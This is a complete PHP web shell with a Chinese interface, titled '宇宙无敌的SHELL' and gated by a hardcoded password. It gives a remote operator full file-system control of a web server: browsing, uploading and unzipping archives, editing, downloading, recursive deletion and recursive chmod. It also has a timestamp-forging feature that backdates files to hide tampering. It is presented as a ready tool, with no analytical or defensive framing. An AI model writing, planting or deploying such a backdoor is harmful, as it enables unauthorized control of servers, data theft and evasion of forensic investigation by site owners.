<?php
header('Content-Type: text/html; charset=utf-8');ob_start();session_start();$c="./";$e='宇宙无敌的SHELL';$f='toberaja';$g=(DIRECTORY_SEPARATOR=='\\')?"windows":'linux';if(isset($_REQUEST['op'])){$h=$_REQUEST['op'];}else{$h='home';}if(isset($_REQUEST['folder'])){$j=$_REQUEST['folder'];}else{$j=str_replace("\\","/",dirname(__FILE__));}$k=str_split($j);if($k[count($k)-1]!=='/'){$j.='/';}while(preg_match('/\.\.\//',$j))$j=preg_replace('/\.\.\//','/',$j);while(preg_match('/\/\//',$j))$j=preg_replace('/\/\//','/',$j);if($j==''){$j=$c;}elseif($c!=''){if(!@ereg($c,$j)){$j=$c;}}$l=$j;if(@$_COOKIE['pass']!=md5($f)){if(@$_REQUEST['pass']==$f){setcookie('pass',md5($f),time()+60*60*24*1);}else{if(@$_REQUEST['pass'])$m=true;login(@$m);}}function maintop($n,$o=true){global $g,$p,$q,$e,$r,$s,$t,$w,$x,$f,$y,$z,$aa;echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html>\n<head>\n"."<title>$e - $n</title>\n"."</head>\n"."<body>\n"."<style>\n*{font-family:'Open Sans','Microsoft Yahei' !important;}.box{border:1px solid #ccc;background-color:#fff;padding:10px;}.title{border:1px solid #ccc;border-bottom:0;font-weight:normal !important;text-align:left !important;width:1000px;padding:10px;font-size:13px;color:#666;background-color:#F0F0F0;}.right{float:right;text-align:right !important;}.content{width:1000px;margin:auto;overflow:hidden;font-size:13px;}.login_button{margin:0 !important;height:46px;vertical-align:middle;font-size:22px !important;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=hIEfix.png,sizingMethod=crop);}.login_text{vertical-align:middle;padding:7px;width:40%;font-size:22px;border:1px #ccc solid;}input[type=text]:focus,input[type=password]:hover{outline:#aaa solid 1px;background-color:#f8f8f8;}input[type=text]:hover,input[type=password]:hover,input[type=password]:active{outline:#aaa solid 1px;background-color:#f8f8f8;}h2{-webkit-font-smoothing:antialiased;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=hIEfix.png,sizingMethod=crop);text-align:center;margin:16px 0;font-size:48px;font-family:simHei,'Microsoft Yahei' !important;}.tips{overflow:auto;margin:6px 0}span{margin-bottom:8px;}a:visited{color:#333;text-decoration:none;}a:hover{color:#999;text-decoration:none;}a:link{color:#333;text-decoration:none;}a:active{color:#999;text-decoration:none;}textarea{outline:none;font-family:'Yahei Consolas Hybrid',Consolas,Verdana,Tahoma,Arial,Helvetica,'Microsoft Yahei',sans-serif !important;font-size:13px;border:1px solid #ccc;margin-top:-1px;padding:8px;line-height:18px;width:982px;max-width:982px;}input.button{outline:none;border-top:1px solid #ccc;border-right:1px solid #ccc;border-left:1px solid #ccc;background-color:#ffffff;border-bottom:2px solid #ccc;*display:inline;text-align:center !important;color:#333 !important;text-decoration:none !important;padding:3px 10px;font-size:13px;margin-top:10px}input.button:hover{background-color:#f8f8f8;}input.text,select,option,.upload{border:1px solid #ccc;margin:6px 1px;padding:5px;font-size:13px;height:16px;}body{background-color:#fff;margin:0px 0px 10px;}.title{font-weight:bold;FONT-SIZE:12px;text-align:center;}.error{font-size:10pt;color:#AA2222;text-align:left}.menu{margin-top:50px;position:fixed;font-size:13px;padding:5px;}.menu li{list-style-type:square;margin-bottom:8px;}.menu a{text-decoration:none;}.menu a:hover{color:#707070;}.table{background-color:#777;color:#fff;}th{text-align:left;height:40px;line-height:40px;border-bottom:3px solid #dbdbdb;font-size:14px;background-color:#f8f8f8 !important;}table{border:1px solid #ccc;}tr{height:31px;font-size:13px;}tr:hover{background-color:#f5f5f5;}td{border-bottom:1px solid #ededed;}.upload{width:375px;}\n</style>\n";if(@$_REQUEST['op']!=='home'){$bb="<li><a href=\"".$p."?op=home&folder=".@$_SESSION['folder']."\">返回上次目录</a></li>\n";}else{$bb='';}if($o){echo "<div class=\"menu\">\n"."<ul><li><a href=\"".$p."?op=home\">原始目录</a></li>\n".$bb."<li><a href=\"".$p."?op=up\">上传文件</a></li>\n"."<li><a href=\"".$p."?op=cr\">创建文件</a></li>\n"."</ul></div>";}echo"<h2>$e</h2>\n";echo "<div class='content'>\n";}function login($m=false){global $p,$h;setcookie("pass","",time()-60*60*24*1);maintop("登录",false);echo "<span class=error>密码！</span><br>\n";echo "<form action=\"".$p."?op=".$h."\" method=\"post\">\n"."<input type=\"password\" name=\"pass\" border=\"0\" class=\"login_text\" value=\"".@$f."\" placeholder=\"请输入密码\">\n"."<input type=\"submit\" name=\"submitButtonName\" value=\"ENTER\" border=\"0\" class=\"login_button button\">\n"."</form>\n";mainbottom();}function translatePermi($cc){if(($cc&0xC000)==0xC000){$dd='s';}elseif(($cc&0xA000)==0xA000){$dd='l';}elseif(($cc&0x8000)==0x8000){$dd='-';}elseif(($cc&0x6000)==0x6000){$dd='b';}elseif(($cc&0x4000)==0x4000){$dd='d';}elseif(($cc&0x2000)==0x2000){$dd='c';}elseif(($cc&0x1000)==0x1000){$dd='p';}else{$dd='u';}$dd.=(($cc&0x0100)?'r':'-');$dd.=(($cc&0x0080)?'w':'-');$dd.=(($cc&0x0040)?(($cc&0x0800)?'s':'x'):(($cc&0x0800)?'S':'-'));$dd.=(($cc&0x0020)?'r':'-');$dd.=(($cc&0x0010)?'w':'-');$dd.=(($cc&0x0008)?(($cc&0x0400)?'s':'x'):(($cc&0x0400)?'S':'-'));$dd.=(($cc&0x0004)?'r':'-');$dd.=(($cc&0x0002)?'w':'-');$dd.=(($cc&0x0001)?(($cc&0x0200)?'t':'x'):(($cc&0x0200)?'T':'-'));return $dd;}function home(){global $g,$p,$j,$l,$c,$ee;maintop("原始目录");echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=100% class='mytable'><form method='post'>\n";$ff="";$gg="";$hh="0";$j=iconv("UTF-8","GBK",$j);$ii=opendir($j);$jj=1;$kk=1;if($j){$_SESSION['folder']=$l;}while($ll=readdir($ii)){$mm=$j;$nn=$ll;if($g!=='windows'):$oo="<td>".translatePermi(fileperms($mm.$nn))."</td>";else:$oo='';endif;if($ll!=="."&&$ll!==".."){if(is_dir($j.$ll)){$ll=iconv("GBK","UTF-8",$ll);$j=iconv("GBK","UTF-8",$j);$pp=@filectime($j.$ll);$qq=($pp>1420045261)?'style="color:red;"':'';$rr=@filemtime($j.$ll);$ss=($rr>1420045261)?'style="color:red;"':'';$ff[$jj]="<tr width=100% ><td><input name='select_item[d][$ll]' type='checkbox' id='$ll' onclick='One($ll)' class=\"checkbox\" value='".$j.$ll."' /></td>\n"."<td><a href=\"".$p."?op=home&folder=".$j.$ll."/\">[".$ll."]</a></td>\n"."<td ".$ss.">".date("Y-m-d H:i:s",$rr)."</td>\n"."<td ".$qq.">".date("Y-m-d H:i:s",$pp)."</td>\n"."<td>文件夹</td>\n"."<td><a href=\"".$p."?op=home&folder=".htmlspecialchars($j.$ll)."/\">打开</a></td>\n"."<td><a href=\"".$p."?op=ren&file=".htmlspecialchars($ll)."&folder=$j\">重命名</a></td>\n"."<td> </td>\n".$oo."</tr>\n";$jj++;$j=iconv("UTF-8","GBK",$j);}else{$k=explode('.',$j.$ll);$k=end($k);$ll=@iconv("GBK","UTF-8",$ll);$j=@iconv("GBK","UTF-8",$j);$tt="/".str_replace($_SERVER["DOCUMENT_ROOT"],"",$j.$ll);$tt=str_replace("//","/",$tt);$pp=@filectime($l.$nn);$rr=@filemtime($l.$nn);$qq=($pp>1420045261)?'style="color:red;"':'';$ss=($rr>1420045261)?'style="color:red;"':'';$gg[$kk]="<tr width=100%><td><input name='select_item[f][$ll]' type='checkbox' id='$ll' class=\"checkbox\" value='".$j.$ll."' /></td>\n"."<td><a href=\"".$tt."\" target='_blank'>".$ll."</a></td>\n"."<td ".$ss.">".date("Y-m-d H:i:s",$rr)."</td>\n"."<td ".$qq.">".date("Y-m-d H:i:s",$pp)."</td>\n"."<td>".Size(filesize($l.$nn))."</td>"."<td><a href=\"".$p."?op=edit&fename=".htmlspecialchars($ll)."&folder=$j\">编辑</a></td>\n"."<td><a href=\"".$p."?op=ren&file=".htmlspecialchars($ll)."&folder=$j\">重命名</a></td>\n"."<td><a href=\"".$p."?op=download&fename=".htmlspecialchars($ll)."&folder=$j\">下载</a></td>\n".$oo."</tr>\n";$kk++;$j=iconv("UTF-8","GBK",$j);}$hh++;}}closedir($ii);$uu=explode('/',$l);array_pop($uu);$vv='';$ww=array();echo '<div class="title">';foreach($uu as $xx){$vv=$vv.$xx.'/';$ww[]=$vv;echo '<a href="'.$p.'?op=home&folder='.$vv.'">'.$xx.'</a> >> ';}echo "文件\n"."<span class='right' style='padding-right: 30px;'>共有 ".$hh." 个文件 服务器时间：".date('Y-m-d H:i:s')."</span></div>"."<div style=\"position:fixed;bottom:0;margin-left:3px;\"><input type=\"checkbox\" id=\"check\" onclick=\"Check()\"> <input type=\"text\" class=\"text\" stlye=\"vertical-align:text-top;\" size=\"17\" id=\"newTime\" name=\"newTime\" value=\"2012-06-12 14:20:30\"> <input class='button' name='action' type='submit' value='修改时间' /> <input class='button' name='action' type='submit' onclick=\"return confirm('您真的要删除选中的文件吗?')\" value='删除' /> <input type=\"text\" class=\"text\" stlye=\"vertical-align:text-top;\" size=\"3\" id=\"chmod\" name=\"chmod\" value=\"0755\"> <input class='button' name='action' type='submit' onclick=\"var t=document.getElementById('chmod').value;return confirm('将这些文件的权限修改为'+t+'？如果是文件夹，将会递归文件夹内所有内容！')\" value='权限' /></div>";if($g!=='windows'):$oo="<th width='69px'>权限</th>\n";else:$oo='';endif;echo "<tr class='headtable' width=100%>"."<script>function Check() {
            var collid = document.getElementById(\"check\")
            var coll = document.getElementsByTagName('input')
            if (collid.checked){
                for(var i = 0; i < coll.length; i++)
                    coll[i].checked = true;
            }else{
                for(var i = 0; i < coll.length; i++)
                    coll[i].checked = false;
            }
         }</script>"."<th width=20></th>\n"."<th>文件名</th>\n"."<th width='165px'>修改时间</th>\n"."<th width='165px'>创建时间</th>\n"."<th width='65px'>大小</th>\n"."<th width='45px'>打开</th>\n"."<th width='55px'>重命名</th>\n"."<th width='40px'>下载</th>\n".$oo."</tr>";if($l!=="./"){$hh=substr_count($l,"/");$yy=explode('/',$l);$zz=1;$bb=".";while($zz<$hh-1){$bb=$bb."/".$yy[$zz];$zz++;}if($g=='windows'):$oo="";else:$oo="<td></td>";endif;if(count($ww)>2){echo "<tr width=100%><td></td><td><a href=\"".$p."?op=home&folder=".$ww[count($ww)-2]."\">上级目录</a></td><td></td><td></td><td></td><td></td>$oo</tr>";}else{echo "<tr width=100%><td></td><td><a href=\"".$p."?op=home&folder=".$ww[0]."\">上级目录</a></td><td></td><td></td><td></td><td></td>$oo</tr>";}}for($jj=1;$jj<count($ff)+1;$jj++){if(empty($ff)){}else{echo@$ff[$jj];}}for($kk=1;$kk<count($gg)+1;$kk++){echo@$gg[$kk];}echo "</table></form>";mainbottom();}function Size($aaa){if($aaa<1024){$bbb=$aaa."b";}elseif($aaa>1024and $aaa<1024*1024){$ccc=round($aaa/1024,1);$bbb=$ccc."k";}elseif($aaa>1024*1024and $aaa<1024*1024*1024){$ccc=round($aaa/1024/1024,1);$bbb=$ccc."M";}elseif($aaa>1024*1024*1024and $aaa<1024*1024*1024*1024){$ccc=round($aaa/1024/1024/1024,1);$bbb=$ccc."G";}elseif($aaa>1024*1024*1024*1024){$ccc=round($aaa/1024/1024/1024/1024,1);$bbb=$ccc."T";}return $bbb;}function up(){global $p,$j,$ddd,$c;maintop("上传");echo "<FORM ENCTYPE=\"multipart/form-data\" ACTION=\"".$p."?op=upload\" METHOD=\"POST\">\n"."<div class=\"title\">本地上传</div><div class=\"box\">根据服务器的设置，最大可上传".ini_get('upload_max_filesize')."的文件，且文件总数的最大值为".ini_get('max_file_uploads')."个<br><input type=\"File\" name=\"upfile[]\" multiple size=\"20\">\n"."<input type=\"text\" name=\"ndir\" value=\"".$_SESSION["folder"]."\" class=\"upload\">\n";echo $ddd."</select></div>"."<div><input hidden=\"true\" type=\"checkbox\" name=\"unzip\" id=\"unzip\" value=\"checkbox\" onclick=\"UpCheck()\"> "."<input hidden=\"true\" type=\"checkbox\" name=\"delzip\" id=\"deluzip\"value=\"checkbox\"><label for=\"deluzip\"></labal> "."<input type=\"submit\" value=\"上传\" class=\"left button\"></div><br><br><br>\n"."<script>function UpCheck(){if(document.getElementById(\"unzip\").checked){document.getElementById(\"deluzip\").disabled=false}else{document.getElementById(\"deluzip\").disabled=true}}</script>"."</form>\n";mainbottom();}function upload($eee,$fff,$ggg,$hhh){global $p,$j;if(empty($fff)){$fff="./";}$iii=$j;$jjj=$fff;$fff=iconv("UTF-8","GBK",$fff);if(!$eee){printerror("您没有选择文件！");exit;}elseif($eee){maintop("上传");if(!file_exists($fff)){mkdir($fff,0755);}$zz=1;echo '<div class="box">';while(count($eee['name'])>=$zz){$kkk=iconv("UTF-8","GBK",$jjj.$eee['name'][$zz-1]);if(@copy($eee['tmp_name'][$zz-1],$kkk)){echo "文件 ".$jjj.$eee['name'][$zz-1]." 上传成功\n<br>";$lll=explode('.',$eee['name'][$zz-1]);if((end($lll)=="zip"||end($lll)=="tar"||end($lll)=="tar.gz"||end($lll)=="gzip"||end($lll)=="gz")&&isset($ggg)&&$ggg=="checkbox"){if(class_exists('ZipArchive')){$mmm=new ZipArchive();if($mmm->open($kkk)===TRUE){if($mmm->extractTo($fff)){for($zz=0;$zz<$mmm->numFiles;$zz++){echo $mmm->getNameIndex($zz).'<br>';}$mmm->close();}echo $eee['name'][$zz-1]." 已经被解压到$jjj<br>";if(isset($hhh)&&$hhh=="checkbox"){if(unlink($kkk.$eee['name'][$zz-1])){echo $eee['name'][$zz-1]." 删除成功<br>";}else{echo $eee['name'][$zz-1].("<span class=\"error\">删除失败！</span><br>");}}}else{echo("<span class=\"error\">无法解压文件：".$jjj.$eee['name'][$zz-1]."</span><br>");}}else{echo("<span class=\"error\">此服务器上的PHP不支持ZipArchive，无法解压文件！</span><br>");}}}else{echo("<span class=\"error\">文件 ".$eee['name'][$zz-1]." 上传失败</span><br>");}$zz++;}echo "现在您可以 <a href=\"".$p."?op=home&folder=".$fff."\">打开上传的文件夹</a> 或者 <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a> 或者 <a href=\"".$p."?op=up\">上传其他文件</a>\n";echo '</div>';mainbottom();}else{printerror("您没有选择文件！");}}function deltree($nnn){if(is_empty_dir($nnn)){rmdir($nnn);}else{$ooo=dir($nnn);while($jj=$ooo->read()){if(is_file($nnn.'/'.$jj)&&($jj!='.')&&($jj!='..')){unlink($nnn.'/'.$jj);}if(is_dir($nnn.'/'.$jj)&&($jj!='.')&&($jj!='..')){if(!is_empty_dir($nnn.'/'.$jj)){deltree($nnn.'/'.$jj);}if(is_empty_dir($nnn.'/'.$jj)){rmdir($nnn.'/'.$jj);}}}$ooo->close();}}function is_empty_dir($nnn){$ooo=opendir($nnn);$zz=0;while($jj=readdir($ooo)){$zz++;}closedir($ooo);if($zz>2){return false;}else return true;}function edit($ppp){global $p,$j;$qqq=iconv("UTF-8","GBK",$j.$ppp);if(file_exists($j.$ppp)){maintop("编辑");echo "<div class=\"title\">编辑文件 ".$j.$ppp."</div>";$rrr=file_get_contents($qqq);if(function_exists('mb_detect_encoding')){$sss=mb_detect_encoding($rrr);}else{$sss='UTF-8';}if($sss!=="UTF-8"&&!empty($sss)){$rrr=iconv("UTF-8",$sss."//IGNORE",$rrr);}echo "<form action=\"".$p."?op=save&encode=".$sss."\" method=\"post\">\n"."<textarea rows=\"24\" name=\"ncontent\">";echo htmlspecialchars($rrr);echo "</textarea>"."<br>\n"."<input type=\"hidden\" name=\"folder\" value=\"".$j."\">\n"."<input type=\"hidden\" name=\"fename\" value=\"".$ppp."\">\n"."<input type=\"submit\" value=\"保存\" class=\"left button\">\n"."</form>\n";mainbottom();}else{home();}}function save($ttt,$ppp,$sss){global $p,$j;if(!$ppp==""){maintop("编辑");$qqq=iconv("UTF-8","GBK",$j.$ppp);$uuu=htmlspecialchars_decode($ttt);if($sss!=="UTF-8"&&$sss!=="ASCII"){$uuu=iconv($sss."//IGNORE","UTF-8",$uuu);}if(file_put_contents($qqq,$uuu)){echo "<div class='box'>文件 <a href=\"".$j.$ppp."\" target=\"_blank\">".$j.$ppp."</a> 保存成功！\n"."请选择 <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a> 或者 <a href=\"".$p."?op=edit&fename=".$ppp."&folder=".$j."\">继续编辑</a></div>\n";$vvv=null;}else{echo "<span class='error'>文件保存出错！</span>\n"." <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a>\n";}mainbottom();}else{home();}}function cr(){global $p,$j,$ddd,$c;maintop("创建");if(!$ddd==""){echo "请输入文件名。\n";}echo "<form action=\"".$p."?op=create\" method=\"post\">\n"."<div class='title'>创建文件/文件夹</div><div class='box'><label for=\"nfname\">文件名：</label><br><input style=\"width:98%\" type=\"text\" size=\"20\" id=\"nfname\" name=\"nfname\" class=\"text\"><br>\n"."<label for=\"ndir\">目标目录：</label><br><input style=\"width:98%\" type=\"text\" class=\"text\" id=\"ndir\" name=\"ndir\" value=\"".$_SESSION['folder']."\">";echo "<br><select name=\"isfolder\" style=\"height:30px;padding:3px;\"><option value=\"0\">文件</option>\n"."<option value=\"1\">文件夹</option></select>\n"."</div><input type=\"hidden\" name=\"folder\" value=\"$j\">\n"."<input type=\"submit\" value=\"创建\" class=\"left button\">\n"."</form>\n";mainbottom();}function create($www,$xxx,$fff){global $p,$j;$yyy=date('Y-m-d H:i:s',mktime(9,12,31,6,10,2011));$zzz=strtotime($yyy);if(!$www==""){maintop("创建");echo '<div class="box">';$fff=iconv("UTF-8","GBK",$fff);$www=iconv("UTF-8","GBK",$www);if($xxx==1){if(@mkdir($fff."/".$www,0755)){$fff=iconv("GBK","UTF-8",$fff);$www=iconv("GBK","UTF-8",$www);@touch($fff."/".$www,$zzz,$zzz);echo "您的目录<a href=\"".$p."?op=home&folder=./".$www."/\">".$fff.$www."/</a> 已经成功被创建。\n"."请选择 <a href=\"".$p."?op=home&folder=".$fff.$www."/\">打开文件夹</a> 或者 <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a>\n";}else{$fff=iconv("GBK","UTF-8",$fff);$www=iconv("GBK","UTF-8",$www);echo "<span class='error'>您的目录".$fff."".$www." 不能被创建。请检查您的目录权限是否已经被设置为可写 或者 目录是否已经存在</span> <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a>\n";}}else{if(@fopen($fff."/".$www,"w")){$fff=iconv("GBK","UTF-8",$fff);$www=iconv("GBK","UTF-8",$www);@touch($fff."/".$www,$zzz,$zzz);echo "您的文件, <a href=\"".$p."?op=viewframe&file=".$www."&folder=$fff\">".$fff.$www."</a> 已经成功被创建\n"."<br><a href=\"".$p."?op=edit&fename=".$www."&folder=".$fff."\">编辑文件</a> 或者是 <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a>\n";}else{$fff=iconv("GBK","UTF-8",$fff);$www=iconv("GBK","UTF-8",$www);echo "<span class='error'>您的文件 ".$fff.$www." 不能被创建。请检查您的目录权限是否已经被设置为可写 或者 文件是否已经存在</span> <a onclick=\"history.go(-1);\" style=\"cursor:pointer\">返回上一步</a>\n";}}echo "</box>";mainbottom();}else{cr();}}function ren($qqq){global $p,$j,$l;$aaaa=$qqq;if(!$qqq==""){maintop("重命名");echo "<form action=\"".$p."?op=rename\" method=\"post\">\n"."<div class=\"title\">重命名 ".$l.$aaaa.'</div>';echo "<div class=\"box\"><input type=\"hidden\" name=\"rename\" value=\"".$aaaa."\">\n"."<input type=\"hidden\" name=\"folder\" value=\"".$l."\">\n"."新文件名：<input class=\"text\" type=\"text\" size=\"20\" name=\"nrename\" value=\"$aaaa\"></div>\n"."<input type=\"Submit\" value=\"重命名\" class=\"right button\"></form>\n";mainbottom();}else{home();}}function renam($bbbb,$cccc,$j){global $p,$j;if(!$bbbb==""){$dddd=iconv("UTF-8","GBK","$j".$bbbb);$eeee=iconv("UTF-8","GBK","$j".$cccc);if(rename($dddd,$eeee)){maintop("重命名");echo "<div class='box'>文件 ".$j.$bbbb." 已被重命名成 ".$j.$cccc."</a>\n"." <a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a></div>\n";mainbottom();}else{printerror("重命名出错！");}}else{home();}}function fileDownload($ppp){global $j;$qqq=iconv("UTF-8","GBK",htmlspecialchars_decode($j.$ppp));if(file_exists($qqq)){if(@is_file($qqq)&&@is_readable($qqq)){ob_start("ob_gzhandler",4096);header("Content-Disposition: attachment; filename=".basename($qqq));header("Content-Type: application/octet-stream");$vvv=@fopen($qqq,"r");if($vvv){while(!@feof($vvv))echo@fread($vvv,1024);fclose($vvv);}}exit;}}function mainbottom(){echo "</div><div style='text-align:center;font-size:13px;color:#999 !important;margin-top:5px;margin-bottom:45px'>"."Shell 1.0.1</div></body>\n"."</html>\n";exit;}function printerror($ffff){maintop("错误");echo "<div class='title'>操作时发生错误</div><div class='box'><span class='error'>\n".$ffff."\n</span> <a onclick=\"history.go(-1);\" style=\"cursor:pointer\">返回上一步</a></div>";}function deleteall($gggg){if(!$gggg==""){$hhhh=$gggg;$gggg=iconv("UTF-8","GBK",$gggg);if(is_dir($gggg)){if(is_empty_dir($gggg)){rmdir($gggg);echo "<span>".$hhhh." 已经被删除</span><br>";}else{deltree($gggg);rmdir($gggg);echo "<span>".$hhhh." 已经被删除</span><br>";}}else{if(@unlink($gggg)){echo '<span>'.$hhhh." 已经被删除</span><br>";}else{echo("<span class='error'>无法删除文件：$hhhh ，可能是文件不存在！</span><br>");}}}}if(@$_POST['action']=='删除'){if(isset($_POST['select_item'])){maintop("删除");echo '<div class="box">';if(@$_POST['select_item']['d']){foreach($_POST['select_item']['d']as $iiii){deleteall($iiii);}}if(@$_POST['select_item']['f']){foreach($_POST['select_item']['f']as $iiii){if(deleteall($iiii)){}}}echo "<a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a>\n";echo '</div>';mainbottom();}else{printerror("您没有选择文件");}}if(@$_POST['action']=='修改时间'){if(isset($_POST['select_item'])){maintop("修改时间");echo '<div class="box">';$jjjj=@strtotime($_REQUEST['newTime']);function changeTime($qqq,$jjjj){touch($qqq,$jjjj,$jjjj);}if(@$_POST['select_item']['d']){foreach($_POST['select_item']['d']as $iiii){$www=iconv("UTF-8","GBK",$iiii);changeTime($www,$jjjj);}}if(@$_POST['select_item']['f']){foreach($_POST['select_item']['f']as $iiii){$www=iconv("UTF-8","GBK",$iiii);changeTime($www,$jjjj);}}echo "<a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">修改完成,返回上次浏览的文件夹</a>\n";echo "</div>";mainbottom();}else{printerror("您没有选择文件");}}if($g!=='windows'):if(@$_POST['action']=='权限'){if(isset($_POST['select_item'])){maintop("修改权限");echo '<div class="box">';$kkkk=octdec($_REQUEST['chmod']);function ChmodMine($qqq,$kkkk){$llll=$qqq;$qqq=iconv("UTF-8","GBK",$qqq);if(is_file($qqq)){if(@chmod($qqq,$kkkk)){echo $llll.' 权限修改成功<br>';}else{echo '<span class="error">'.$llll.' 权限修改失败</span><br>';}}elseif(is_dir($qqq)){if(@chmod($qqq,$kkkk)){echo $llll.' 权限修改成功<br>';}else{echo '<span class="error">'.$llll.' 权限修改失败</span><br>';}$mmmm=@scandir($qqq);$nnnn=@array_slice($mmmm,2);foreach($nnnn as $oooo){$pppp=iconv("GBK","UTF-8",$oooo);ChmodMine($llll.'/'.$pppp,$kkkk);}}else{echo '<span class="error">'.$llll.' 文件不存在！</span><br>';}}if(@$_POST['select_item']['d']){foreach($_POST['select_item']['d']as $iiii){ChmodMine($iiii,$kkkk);}}if(@$_POST['select_item']['f']){foreach($_POST['select_item']['f']as $iiii){ChmodMine($iiii,$kkkk);}}echo "<a href=\"".$p."?op=home&folder=".$_SESSION['folder']."\">返回上次浏览的文件夹</a>\n";echo "</div>";mainbottom();}else{printerror("您没有选择文件");}}endif;switch($h){case  "home":home();break;case  "up":up();break;case  "upload":if(!isset($_FILES['upfile'])){printerror('您没有选择文件！');}elseif(isset($_REQUEST['ndir'])){upload($_FILES['upfile'],$_REQUEST['ndir'],@$_REQUEST['unzip'],@$_REQUEST['delzip']);}else{upload($_FILES['upfile'],'./',@$_REQUEST['unzip'],@$_REQUEST['delzip']);}break;case  "edit":edit($_REQUEST['fename']);break;case  "save":save($_REQUEST['ncontent'],$_REQUEST['fename'],$_REQUEST['encode']);break;case  "cr":cr();break;case  "download":fileDownload($_REQUEST['fename']);break;case  "create":create($_REQUEST['nfname'],$_REQUEST['isfolder'],$_REQUEST['ndir']);break;case  "ren":ren($_REQUEST['file']);break;case  "rename":renam($_REQUEST['rename'],$_REQUEST['nrename'],$j);break;case  "printerror":printerror($ffff);break;default:home();break;}?>